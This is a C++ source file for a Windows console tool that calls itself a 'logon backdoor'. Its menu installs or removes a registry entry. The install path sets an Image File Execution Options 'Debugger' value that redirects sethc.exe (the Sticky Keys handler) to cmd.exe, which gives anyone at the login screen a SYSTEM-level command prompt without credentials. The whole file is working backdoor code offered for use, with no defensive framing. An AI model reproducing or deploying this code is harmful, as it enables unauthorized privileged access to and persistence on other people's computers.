#include <iostream>
#include <cstdlib>
#include <conio.h>
#include <windows.h>

void writeToRegistry();

void removeFromRegistry();

using namespace std;

int main()
{
    string a = "  _                             _                _       _                  \n"; cout << a;
    string b = " | |                           | |              | |     | |                 \n"; cout << b;
    string c = " | | ___   __ _  ___  _ __     | |__   __ _  ___| | ____| | ___   ___  _ __ \n"; cout << c;
    string d = " | |/ _ \\ / _` |/ _ \\| '_ \\    | '_ \\ / _` |/ __| |/ / _` |/ _ \\ / _ \\| '__|\n"; cout << d;
    string e = " | | (_) | (_| | (_) | | | |   | |_) | (_| | (__|   < (_| | (_) | (_) | |   \n"; cout << e;
    string f = " |_|\\___/ \\__, |\\___/|_| |_|   |_.__/ \\__,_|\\___|_|\\_\\__,_|\\___/ \\___/|_|   \n"; cout << f;
    string g = "           __/ |                                                            \n"; cout << g;
    string h = "          |___/                                                             \n\n"; cout << h;

    cout<<"===================================MENU=====================================\n\n";

    cout<<"1. Set up the backdoor\n"
          "2. Remove backdoor from PC\n"
          "3. Exit\n\n";

	int menu_int;

    cout<<"Enter the number: ";

    menu_int = getch();

    switch (menu_int)
	{
		case '1':
		    writeToRegistry();
        break;

        case '2':
            removeFromRegistry();
        break;

        case '3':
            return 1;

		default:
		    cout << "\n\nEnter the number from menu!\n\n";
		    break;
	}

    system("pause");
    return 0;
}

void writeToRegistry()
{
  DWORD lRv;
  HKEY hKey;


  lRv = RegOpenKeyEx(
    HKEY_LOCAL_MACHINE,
    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
    0,
    KEY_WRITE,
    &hKey
  );

  if (lRv != ERROR_SUCCESS)
  {
    DWORD dwDisposition;

    const char path[]="C:\\windows\\system32\\cmd.exe";

    lRv = RegCreateKeyEx(
      HKEY_LOCAL_MACHINE,
      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
      0,
      NULL,
      REG_OPTION_NON_VOLATILE,
      KEY_ALL_ACCESS,
      NULL,
      &hKey,
      &dwDisposition
    );

    RegSetValueEx(
      hKey,
      "Debugger",
      0,
      REG_SZ,
      (BYTE*) path,
      strlen(path)
    );

    RegCloseKey(hKey);

    cout << "\n\nBackdoor has been set up successfully\n" << endl;

  }
  else
  {
      cout << "\n\nBackdoor is already set up ;)\n\n";
  }
}

void removeFromRegistry()
{
    DWORD lRv;
    HKEY hKey;

    lRv = RegOpenKeyEx(
      HKEY_LOCAL_MACHINE,
      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
      0,
      KEY_WRITE,
      &hKey
    );

    if (lRv == ERROR_SUCCESS)
    {
        RegDeleteKey(
            HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe"
        );

        cout << "\n\nDone!\n\n";
    }
    else
    {
        cout << "\n\nBackdoor is already removed :)\n\n";
    }
}
